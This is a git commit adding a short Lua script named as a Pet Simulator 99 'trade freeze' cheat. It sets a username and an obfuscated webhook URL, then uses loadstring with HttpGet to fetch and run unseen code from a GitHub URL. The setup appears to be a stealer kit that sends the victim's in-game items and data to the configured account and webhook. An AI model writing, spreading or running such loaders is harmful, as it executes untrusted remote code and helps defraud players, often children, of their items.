60c2420d275261bb74151f9b585fa1558cfb2f7a
TradeHack <parthsharmamanu7@gmail.com>
2025-04-14 08:55:05 +0530

    Create PetSimTradeFreeze.lua

---
+++ PetSimTradeFreeze.lua
@@ -0,0 +1,4 @@
+Username = "TruuFruuPlayz" -- << Your Username
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=Y0pFNlhfQWwwWVB5Rk5yNWh6dkV0QTp3RTdJWWU0SnBKaDJmMld6VHc4OTRyLTBuZGdQejB4bC1LLTdGZHJiWEVzeExBc2FiNFplT0pKNnBWUWZZQlJER0Y0RU16R0IwdFNBcW82UXQ2MjZiQ2lXSmZuRFA2OFk0ZkRPVzM1b1hIbHBGUHNTS0JKWlJ0dThvLUNHRVdFSGdKOVFjX2M0TDR3RVhZbnVvOF9YRDdYdUtaX1RkMVo1RjdmZFlLZmhoUUE" -- << Your Webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/ps99/refs/heads/main/Rua99"))()
